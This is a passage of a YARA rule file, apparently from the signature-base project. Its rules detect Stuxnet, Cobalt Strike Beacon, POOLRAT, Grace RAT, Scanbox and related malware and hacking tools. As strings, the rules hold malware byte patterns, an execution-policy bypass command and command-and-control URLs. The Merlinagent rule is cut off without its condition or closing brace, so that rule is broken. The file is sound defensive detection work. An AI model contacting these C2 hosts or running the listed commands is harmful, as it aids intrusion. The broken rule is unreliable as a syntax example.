		hash2 = "4b236b066ac7b8386a13270dcb7fdff2dda81365d03f53867eb72e29d5e496de"
		hash3 = "3fe78949a9f3068db953b475177bcad3c76d16169469afd72791b4312f60cfb3"
		hash4 = "64c24bbf42f15dcac04371aef756feabb7330f436c20f33cb25fbc8d0ff014c7"
		hash5 = "a237a2bd6aec429f9941d6de632aeb9729880aa3d5f6f87cf33a76d6caa30619"
		hash6 = "89748906d1c574a75fe030645c7572d7d4145b143025aa74c9b5e2be69df8773"
		hash7 = "f4b728c93dba20a163b59b4790f29aed1078706d2c8b07dc7f4e07a6f3ecbe93"

	strings:
		$s3 = ":%s/CRYPTKEY/CRYPTKEY/g" fullword ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_FVEY_Shadowbroker_Gen_Readme4
{
	meta:
		description = "Auto-generated rule - from files violetspirit.README, violetspirit.README"
		author = "Florian Roth (Nextron Systems)"
		id = "9e84e4ab-f74a-59e5-aee2-408a68cd673f"
		date = "2016-12-17"
		modified = "2023-12-05"
		reference = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_fvey_shadowbroker_dec16.yar#L413-L429"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "c19c77d7e7e26e01a9a50fd67cc0a7fd05069def878bf18726c3e115df307cb2"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash1 = "a55fec73595f885e43b27963afb17aee8f8eefe811ca027ef0d7721d073e67ea"
		hash2 = "a55fec73595f885e43b27963afb17aee8f8eefe811ca027ef0d7721d073e67ea"

	strings:
		$s1 = "[-v rpc version] : default 4 : Solaris 8 and other patched versions use version 5" fullword ascii
		$s5 = "[-n tcp_port]    : default use portmapper to determine" fullword ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_Win_Privesc_Folderperm
{
	meta:
		description = "Detects a tool that can be used for privilege escalation - file folderperm.ps1"
		author = "Florian Roth (Nextron Systems)"
		id = "131fdb57-f9ca-5247-8bb4-c939eff5b8bf"
		date = "2016-06-02"
		modified = "2023-12-05"
		reference = "http://www.greyhathacker.net/?p=738"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_win_privesc.yar#L28-L44"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "899fda75e4c6d9f588767e5170dbd30241a492ba89f7cc1b0ad4adb2fcd173cb"
		score = 80
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "1aa87df34826b1081c40bb4b702750587b32d717ea6df3c29715eb7fc04db755"

	strings:
		$x1 = "# powershell.exe -executionpolicy bypass -file folderperm.ps1" fullword ascii
		$x2 = "Write-Host \"[i] Dummy test file used to test access was not outputted:\" $filetocopy" fullword ascii
		$x3 = "Write-Host -foregroundColor Red \"      Access denied :\" $myarray[$i] " fullword ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_Win_Privesc_Adaclscan4_3
{
	meta:
		description = "Detects a tool that can be used for privilege escalation - file ADACLScan4.3.ps1"
		author = "Florian Roth (Nextron Systems)"
		id = "15867a9c-9b9b-5d29-bf51-2b3e91af556f"
		date = "2016-06-02"
		modified = "2023-12-05"
		reference = "https://adaclscan.codeplex.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_win_privesc.yar#L46-L62"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "ca657e5c4172d240f46a890fc112ee89d5bdf9e35e7d412332ee11bdaf166215"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "3473ddb452de7640fab03cad3e8aaf6a527bdd6a7a311909cfef9de0b4b78333"

	strings:
		$s1 = "<Label x:Name=\"lblPort\" Content=\"Port:\"  HorizontalAlignment=\"Left\" Height=\"28\" Margin=\"10,0,0,0\" Width=\"35\"/>" fullword ascii
		$s2 = "(([System.IconExtractor]::Extract(\"mmcndmgr.dll\", 126, $true)).ToBitMap()).Save($env:temp + \"\\Other.png\")    " fullword ascii
		$s3 = "$bolValid = $ctx.ValidateCredentials($psCred.UserName,$psCred.GetNetworkCredential().Password)" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_SUSP_Base64_Encoded_Hex_Encoded_Code
{
	meta:
		description = "Detects hex encoded code that has been base64 encoded"
		author = "Florian Roth (Nextron Systems)"
		id = "2cfd278f-ff45-5e23-b552-dad688ab303b"
		date = "2019-04-29"
		modified = "2025-03-21"
		reference = "https://www.nextron-systems.com/2019/04/29/spotlight-threat-hunting-yara-rule-example/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_susp_obfuscation.yar#L2-L17"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "f1451e2dd0e4e70a0f39f609331762cce369642e9fadbef83d932da2a0a6c60b"
		score = 65
		quality = 85
		tags = ""

	strings:
		$x1 = { 78 34 4e ?? ?? 63 65 44 ?? ?? 58 48 67 }
		$x2 = { 63 45 44 ?? ?? 58 48 67 ?? ?? ?? 78 34 4e }
		$fp1 = "Microsoft Azure Code Signp$"

	condition:
		1 of ( $x* ) and not 1 of ( $fp* )
}

rule SIGNATURE_BASE_SUSP_Script_Base64_Blocks_Jun20_1
{
	meta:
		description = "Detects suspicious file with base64 encoded payload in blocks"
		author = "Florian Roth (Nextron Systems)"
		id = "cef759a5-b02a-53e7-bf27-184eee6bc3fa"
		date = "2020-06-05"
		modified = "2025-03-21"
		reference = "https://posts.specterops.io/covenant-v0-5-eee0507b85ba"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_susp_obfuscation.yar#L85-L98"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "7d456cbbbd76f543afe144a2876a02db834aa6b09ecd4d6aa2f25ce8eeac5de8"
		score = 70
		quality = 85
		tags = ""

	strings:
		$sa1 = "<script language=" ascii
		$sb2 = { 41 41 41 22 2B 0D 0A 22 41 41 41 }

	condition:
		all of them
}

rule SIGNATURE_BASE_Stuxnet_Malware_1
{
	meta:
		description = "Stuxnet Sample - file malware.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "1f475dc3-ebb3-508f-b696-3d9ea270b13d"
		date = "2016-07-09"
		modified = "2023-12-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_stuxnet.yar#L10-L41"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "8caa6bddef3c05e572ef342513190832900dcb1a7a56589ed7df48b3c6992ed1"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "9c891edb5da763398969b6aaa86a5d46971bd28a455b20c2067cb512c9f9a0f8"

	strings:
		$op1 = { 8b 45 08 35 dd 79 19 ae 33 c9 8b 55 08 89 02 89 }
		$op2 = { 74 36 8b 7f 08 83 ff 00 74 2e 0f b7 1f 8b 7f 04 }
		$op3 = { 74 70 81 78 05 8d 54 24 04 75 1b 81 78 08 04 cd }

	condition:
		all of them
}

rule SIGNATURE_BASE_Stuxnet_Maindll_Decrypted_Unpacked
{
	meta:
		description = "Stuxnet Sample - file maindll.decrypted.unpacked.dll_"
		author = "Florian Roth (Nextron Systems)"
		id = "7009a41c-0588-5392-ae1c-045e0a5ee56b"
		date = "2016-07-09"
		modified = "2023-12-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_stuxnet.yar#L130-L150"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "bec740cdb4c1748d0fb546691cf8feb38c0e61adad60c069c5866f5034cb7ed9"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "4c3d7b38339d7b8adf73eaf85f0eb9fab4420585c6ab6950ebd360428af11712"

	strings:
		$s1 = "%SystemRoot%\\system32\\Drivers\\mrxsmb.sys;%SystemRoot%\\system32\\Drivers\\*.sys" fullword wide
		$s2 = "<Actions Context=\"%s\"><Exec><Command>%s</Command><Arguments>%s,#%u</Arguments></Exec></Actions>" fullword wide
		$s3 = "%SystemRoot%\\inf\\oem7A.PNF" fullword wide
		$s4 = "%SystemRoot%\\inf\\mdmcpq3.PNF" fullword wide
		$s5 = "%SystemRoot%\\inf\\oem6C.PNF" fullword wide
		$s6 = "@abf varbinary(4096) EXEC @hr = sp_OACreate 'ADODB.Stream', @aods OUT IF @hr <> 0 GOTO endq EXEC @hr = sp_OASetProperty @" wide
		$s7 = "STORAGE#Volume#1&19f7e59c&0&" fullword wide
		$s8 = "view MCPVREADVARPERCON as select VARIABLEID,VARIABLETYPEID,FORMATFITTING,SCALEID,VARIABLENAME,ADDRESSPARAMETER,PROTOKOLL,MAXLIMI" ascii

	condition:
		6 of them
}

rule SIGNATURE_BASE_SUSP_APT_MAL_VEILEDSIGNAL_Backdoor_Apr23
{
	meta:
		description = "Detects marker found in VEILEDSIGNAL backdoor"
		author = "X__Junior"
		id = "8f0d92b6-d9b0-55e3-b2ca-601d095f5279"
		date = "2023-04-20"
		modified = "2023-04-21"
		reference = "https://www.mandiant.com/resources/blog/3cx-software-supply-chain-compromise"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_nk_tradingtech_apr23.yar#L19-L35"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "ccb482a7634dc24fde03b5730bf28a9e028f8d5a9ad46ba9663d1b520264d8f4"
		score = 75
		quality = 85
		tags = ""
		hash1 = "aa318070ad1bf90ed459ac34dc5254acc178baff3202d2ea7f49aaf5a055dd43"

	strings:
		$opb1 = { 81 BD ?? ?? ?? ?? 5E DA F3 76}
		$opb2 = { C7 85 ?? ?? ?? ?? 74 F2 39 DA 66 C7 85 ?? ?? ?? ?? E5 CF}
		$opb3 = { C7 85 ?? ?? ?? ?? 74 F2 39 DA B9 00 04 00 00 66 C7 85 ?? ?? ?? ?? E5 CF }

	condition:
		2 of them
}

rule SIGNATURE_BASE_SUSP_NK_MAL_M_Hunting_POOLRAT
{
	meta:
		description = "Detects strings found in POOLRAT malware"
		author = "Mandiant"
		id = "70f5f3a0-0fd0-54dc-97cc-4f3c35f02fcd"
		date = "2023-04-20"
		modified = "2023-12-05"
		old_rule_name = "APT_NK_MAL_M_Hunting_POOLRAT"
		reference = "https://www.mandiant.com/resources/blog/3cx-software-supply-chain-compromise"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_nk_tradingtech_apr23.yar#L166-L202"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "ac8db844a9c4ed961930417809afb706ea948c4509a4be1eaeed77f09c86069d"
		score = 70
		quality = 83
		tags = ""
		disclaimer = "This rule is meant for hunting and is not tested to run in a production environment"
		hash1 = "451c23709ecd5a8461ad060f6346930c"

	strings:
		$s1 = "name=\"uid\"%s%s%u%s" ascii wide
		$s2 = "name=\"session\"%s%s%u%s" ascii wide
		$s3 = "name=\"action\"%s%s%s%s" ascii wide
		$s4 = "name=\"token\"%s%s%u%s" ascii wide
		$str1 = "--N9dLfqxHNUUw8qaUPqggVTpX-" wide ascii nocase

	condition:
		any of ( $s* ) or $str1
}

rule SIGNATURE_BASE_SUSP_TH_APT_UNC4736_Tradingtech_Cert_Apr23_1
{
	meta:
		description = "Threat hunting rule that detects samples signed with the compromised Trading Technologies certificate after May 2022"
		author = "Florian Roth"
		id = "9a05fba9-9466-5b69-9207-27ad01d6eb8b"
		date = "2023-04-20"
		modified = "2023-12-05"
		reference = "https://www.mandiant.com/resources/blog/3cx-software-supply-chain-compromise"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_nk_tradingtech_apr23.yar#L227-L242"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "47941828b3c18ed39eddacbc73e147651a9bd48e1a0f7b9847ff1d4c6fea6afd"
		score = 65
		quality = 85
		tags = ""

	strings:
		$s1 = { 00 85 38 A6 C5 01 8F 50 FC }
		$s2 = "Go Daddy Secure Certificate Authority - G2"
		$s3 = "Trading Technologies International, Inc"

	condition:
		pe.timestamp> 1651363200 and all of them
}

rule SIGNATURE_BASE_Cobaltgang_PDF_Metadata_Rev_A
{
	meta:
		description = "Find documents saved from the same potential Cobalt Gang PDF template"
		author = "Palo Alto Networks Unit 42"
		id = "bcf5bf6e-c786-5f78-bf58-e0631a17e62e"
		date = "2018-10-25"
		modified = "2023-12-05"
		reference = "https://researchcenter.paloaltonetworks.com/2018/10/unit42-new-techniques-uncover-attribute-cobalt-gang-commodity-builders-infrastructure-revealed/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/crime_cobalt_gang_pdf.yar#L1-L12"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "8020ccff761b49d98e18cd5cb3c0695956a88e86a0958bfba1a19b7e3e629bb9"
		score = 75
		quality = 85
		tags = ""

	strings:
		$ = "<xmpMM:DocumentID>uuid:31ac3688-619c-4fd4-8e3f-e59d0354a338" ascii wide

	condition:
		any of them
}

rule SIGNATURE_BASE_Coreimpact_Sysdll_Exe
{
	meta:
		description = "Detects a malware sysdll.exe from the Rocket Kitten APT"
		author = "Florian Roth (Nextron Systems)"
		id = "bac55c00-5d14-59ca-8597-f52b4577be0c"
		date = "2014-12-27"
		modified = "2023-01-06"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_coreimpact_agent.yar#L6-L27"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "f89a4d4ae5cca6d69a5256c96111e707"
		logic_hash = "332b68e797e8ee3e26d797e106ae31e7240585ccb0ea599bebd8ac8f94313eab"
		score = 70
		quality = 85
		tags = ""

	strings:
		$s0 = "d:\\nightly\\sandbox_avg10_vc9_SP1_2011\\source\\avg10\\avg9_all_vs90\\bin\\Rele" ascii
		$s1 = "Mozilla/5.0" fullword ascii
		$s3 = "index.php?c=%s&r=%lx" fullword ascii
		$s4 = "index.php?c=%s&r=%x" fullword ascii
		$s5 = "127.0.0.1" fullword ascii
		$s6 = "/info.dat" ascii
		$s7 = "needroot" fullword ascii
		$s8 = "./plugins/" ascii

	condition:
		$s0 or 6 of them
}

rule SIGNATURE_BASE_APT_Malware_Putterpanda_WUAUCLT
{
	meta:
		description = "Detects a malware related to Putter Panda"
		author = "Florian Roth (Nextron Systems)"
		id = "5c8e0629-b5f2-5933-8c74-c49b756aaf18"
		date = "2015-06-03"
		modified = "2023-12-05"
		reference = "VT Analysis"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_putterpanda.yar#L81-L108"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "fd5ca5a2d444865fa8320337467313e4026b9f78"
		logic_hash = "49cae3b727d6b2673dc9a6497d59c9abdd78d486e1eaf6f036f6eb1aef9a8fcb"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$x0 = "WUAUCLT.EXE" fullword wide
		$x1 = "%s\\tmp%d.exe" fullword ascii
		$x2 = "Microsoft Corporation. All rights reserved." fullword wide
		$s1 = "Microsoft Windows Operating System" fullword wide
		$s2 = "InternetQueryOptionA" fullword ascii
		$s3 = "LookupPrivilegeValueA" fullword ascii
		$s4 = "WNetEnumResourceA" fullword ascii
		$s5 = "HttpSendRequestExA" fullword ascii
		$s6 = "PSAPI.DLL" fullword ascii
		$s7 = "Microsoft(R) Windows(R) Operating System" fullword wide
		$s8 = "CreatePipe" fullword ascii
		$s9 = "EnumProcessModules" fullword ascii

	condition:
		all of ( $x* ) or ( 1 of ( $x* ) and all of ( $s* ) )
}

rule SIGNATURE_BASE_STUXSHOP_Config
{
	meta:
		description = "Stuxshop standalone sample configuration"
		author = "JAG-S (turla@chronicle.security)"
		id = "67367db5-51b3-5177-960a-5b06161154e2"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://medium.com/chronicle-blog/who-is-gossipgirl-3b4170f846c0"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_stuxshop.yar#L2-L30"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "c1961e54d60e34bbec397c9120564e8d08f2f243ae349d2fb20f736510716579"
		logic_hash = "9dd57f8b4e25a53dcf54dc75a1bb26675c7dd04dbb4d96286bcc0a6527a21782"
		score = 75
		quality = 85
		tags = ""

	strings:
		$cnc1 = "http://211.24.237.226/index.php?data=" ascii wide
		$cnc2 = "http://todaysfutbol.com/index.php?data=" ascii wide
		$cnc3 = "http://78.111.169.146/index.php?data=" ascii wide
		$cnc4 = "http://mypremierfutbol.com/index.php?data=" ascii wide
		$regkey1 = "Software\\Microsoft\\Windows\\CurrentVersion\\MS-DOS Emulation" ascii wide
		$regkey2 = "NTVDMParams" ascii wide
		$flowerOverlap1 = { 85 C0 75 3B 57 FF 75 1C FF 75 18 FF 75 14 50 FF 75 10 FF 75 FC FF 15 }
		$flowerOverlap2 = { 85 C0 75 4C 8B 45 1C 89 45 0C 8D 45 0C 50 8D 45 08 FF 75 18 50 6A 00 FF 75 10 FF 75 20 FF 15 }
		$flowerOverlap3 = { 55 8B EC 53 56 8B 75 20 85 F6 74 03 83 26 00 8D 45 20 50 68 19 00 02 00 6A 00 FF 75 0C FF 75 08 }
		$flowerOverlap4 = { 55 8B EC 51 8D 4D FC 33 C0 51 50 6A 26 50 89 45 FC FF 15 }
		$flowerOverlap5 = { 85 DB 74 04 8B C3 EB 1A 8B 45 08 3B 45 14 74 07 B8 5D 06 00 00 EB 0B 85 F6 74 05 8B 45 0C 89 06 }
		$flowerOverlap6 = { 85 FF 74 12 83 7D F8 01 75 0C FF 75 0C FF 75 08 FF 15 }

	condition:
		all of ( $flowerOverlap* ) or 2 of ( $cnc* ) or all of ( $regkey* )
}

rule SIGNATURE_BASE_STUXSHOP_Oscheck
{
	meta:
		description = "Identifies the OS Check function in STUXSHOP and CheshireCat"
		author = "Silas Cutler (havex@Chronicle.Security)"
		id = "24fb5c6f-d5ab-5f17-942c-b712e2c017d4"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_stuxshop.yar#L32-L47"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "c1961e54d60e34bbec397c9120564e8d08f2f243ae349d2fb20f736510716579"
		logic_hash = "3dca26e622289c2d244e3af035e892455a47daa67dbe0c6fad29d9f7403cbc6b"
		score = 75
		quality = 85
		tags = ""

	strings:
		$ = {10 F7 D8 1B C0 83 C0 ?? E9 ?? 01 00 00 39 85 7C FF FF FF 0F 85 ?? 01 00
      00 83 BD 70 FF FF FF 04 8B 8D 74 FF FF FF 75 0B 85 C9 0F 85 ?? 01 00 00 6A 05
      5E }
		$ = {01 00 00 3B FA 0F 84 ?? 01 00 00 80 7D 80 00 B1 62 74 1D 6A 0D 8D 45 80
      68 ?? ?? ?? 10 50 FF 15 ?? ?? ?? 10 83 C4 0C B1 6F 85 C0 75 03 8A 4D 8D 8B C6
      }

	condition:
		any of them
}

rule SIGNATURE_BASE_MAL_Grace_Dec22
{
	meta:
		description = "Detects Grace (aka FlawedGrace and GraceWire) RAT"
		author = "X__Junior"
		id = "fc2214dc-f1e5-52d7-a9de-88709a03b04e"
		date = "2022-12-13"
		modified = "2023-12-05"
		reference = "https://blog.talosintelligence.com/breaking-the-silence-recent-truebot-activity/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/expl_sysaid_cve_2023_47246.yar#L40-L59"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "8276662dadfa2f8e07dd7882a60e55bd22ecf1f8f66a09940f16236598646560"
		score = 70
		quality = 85
		tags = ""
		hash1 = "a66df3454b8c13f1b92d8b2cf74f5bfcdedfbff41a5e4add62e15277d14dd169"
		hash2 = "e113a8df3c4845365f924bacf10c00bcc5e17587a204b640852dafca6db20404"

	strings:
		$sa1 = "Grace finalized, no more library calls allowed." ascii
		$sa2 = "Socket forcibly closed due to no response to DISCONNECT signal from other side, worker id(%d)" ascii
		$sa3 = "AVWireCleanupThread" ascii
		$sa4 = "AVTunnelClientDirectIO" ascii
		$sa5 = "AVGraceTunnelWriteThread" ascii
		$sa6 = "AVGraceTunnelClientDirectIO" ascii

	condition:
		2 of them
}

rule SIGNATURE_BASE_Merlinagent
{
	meta:
		description = "Detects Merlin agent"
		author = "Hilko Bengen"
		id = "92346a3f-dce4-58db-893b-b7797fa20029"
		date = "2017-12-26"
		modified = "2023-12-05"
		reference = "https://github.com/Ne0nd0g/merlin"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_merlin_agent.yar#L2-L27"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "21743230556cc11a78942de30be476ad8e73731bbda9a4feb83bd8140a703d01"
		score = 75
		quality = 85
		tags = ""
		filetype = "pe, elf, mach"

	strings:
		$x1 = "Command output:\x0d\x0a\x0d\x0a%s"
		$x2 = "[-]Connecting to web server at %s to update agent configuration information."
		$x3 = "[-]%d out of %d total failed checkins"
		$x4 = "[!}Unknown AgentControl message type received %s"

rule SIGNATURE_BASE_HKTL_Cobaltstrike_Beacon_Strings
{
	meta:
		description = "Identifies strings used in Cobalt Strike Beacon DLL"
		author = "Elastic"
		id = "af558aa2-a3dc-5a7a-bc74-42bb2246091c"
		date = "2021-03-16"
		modified = "2023-12-05"
		reference = "https://www.elastic.co/blog/detecting-cobalt-strike-with-memory-signatures"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_cobaltstrike.yar#L54-L67"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "4349a7ad94df2269217b55c2aef9628c4eef078566c276936accdd4f996ba2cf"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "%02d/%02d/%02d %02d:%02d:%02d"
		$s2 = "Started service %s on %s"
		$s3 = "%s as %s\\%s: %d"

	condition:
		2 of them
}

rule SIGNATURE_BASE_HKTL_Cobaltstrike_Beacon_XOR_Strings
{
	meta:
		description = "Identifies XOR'd strings used in Cobalt Strike Beacon DLL"
		author = "Elastic"
		id = "359160a8-cf1c-58a8-bf7f-c09a8d661308"
		date = "2021-03-16"
		modified = "2023-12-05"
		reference = "https://www.elastic.co/blog/detecting-cobalt-strike-with-memory-signatures"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_cobaltstrike.yar#L69-L88"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "b5009c29055784ce6371100417b862f723d7e3c1b4081c563fcd8770db48051f"
		score = 75
		quality = 85
		tags = ""
		xor_s1 = "%02d/%02d/%02d %02d:%02d:%02d"
		xor_s2 = "Started service %s on %s"
		xor_s3 = "%s as %s\\%s: %d"

	strings:
		$s1 = "%02d/%02d/%02d %02d:%02d:%02d" xor(0x01-0xff)
		$s2 = "Started service %s on %s" xor(0x01-0xff)
		$s3 = "%s as %s\\%s: %d" xor(0x01-0xff)
		$fp1 = "MalwareRemovalTool"

	condition:
		2 of ( $s* ) and not 1 of ( $fp* )
}

rule SIGNATURE_BASE_HKTL_Cobaltstrike_Beacon_4_2_Decrypt
{
	meta:
		description = "Identifies deobfuscation routine used in Cobalt Strike Beacon DLL version 4.2"
		author = "Elastic"
		id = "63b71eef-0af5-5765-b957-ccdc9dde053b"
		date = "2021-03-16"
		modified = "2023-12-05"
		reference = "https://www.elastic.co/blog/detecting-cobalt-strike-with-memory-signatures"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_cobaltstrike.yar#L90-L102"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "8685b1626c8d263f49ccf129dcd4fe1b42482fcdb37c2e109cedcecaed8c2407"
		score = 75
		quality = 85
		tags = ""

	strings:
		$a_x64 = {4C 8B 53 08 45 8B 0A 45 8B 5A 04 4D 8D 52 08 45 85 C9 75 05 45 85 DB 74 33 45 3B CB 73 E6 49 8B F9 4C 8B 03}
		$a_x86 = {8B 46 04 8B 08 8B 50 04 83 C0 08 89 55 08 89 45 0C 85 C9 75 04 85 D2 74 23 3B CA 73 E6 8B 06 8D 3C 08 33 D2}

	condition:
		any of them
}

rule SIGNATURE_BASE_Scanbox_Malware_Generic
{
	meta:
		description = "Scanbox Chinese Deep Panda APT Malware http://goo.gl/MUUfjv and http://goo.gl/WXUQcP"
		author = "Florian Roth (Nextron Systems)"
		id = "f7867e65-567f-530f-83d4-b5126021e523"
		date = "2015-02-28"
		modified = "2023-12-05"
		reference = "http://goo.gl/WXUQcP"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_scanbox_deeppanda.yar#L2-L34"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "5f521d3f000fb39e5e3b08657e75219e93fb3bb8ffbbdbd70f471928a56bef27"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "8d168092d5601ebbaed24ec3caeef7454c48cf21366cd76560755eb33aff89e9"
		hash2 = "d4be6c9117db9de21138ae26d1d0c3cfb38fd7a19fa07c828731fa2ac756ef8d"
		hash3 = "3fe208273288fc4d8db1bf20078d550e321d9bc5b9ab80c93d79d2cb05cbf8c2"

	strings:
		$s0 = "http://142.91.76.134/p.dat" fullword ascii
		$s1 = "HttpDump 1.1" fullword ascii
		$s3 = "SecureInput .exe" fullword wide
		$s4 = "http://extcitrix.we11point.com/vpn/index.php?ref=1" fullword ascii
		$s5 = "%SystemRoot%\\System32\\svchost.exe -k msupdate" fullword ascii
		$s6 = "ServiceMaix" fullword ascii
		$x1 = "Management Support Team1" fullword ascii
		$x2 = "DTOPTOOLZ Co.,Ltd.0" fullword ascii
		$x3 = "SEOUL1" fullword ascii

	condition:
		(1 of ( $s* ) and 2 of ( $x* ) ) or ( 3 of ( $x* ) )
}

rule SIGNATURE_BASE_Cobaltstrike_Resources_Beacon_Dll_V3_8_1
{
	meta:
		description = "Cobalt Strike's resources/beacon.dll Versions 3.8"
		author = "gssincla@google.com"
		id = "6c65cbf8-2c60-5315-b3b2-48dfcee75733"
		date = "2022-11-18"
		modified = "2023-12-05"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_gcti_cobaltstrike.yar#L1020-L1061"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "67b6557f614af118a4c409c992c0d9a0cc800025f77861ecf1f3bbc7c293d603"
		logic_hash = "cde078a6ae7d0d835900e85498cf5ae20663ba8d5d3f912810e157261561e16a"
		score = 75
		quality = 85
		tags = ""

	strings:
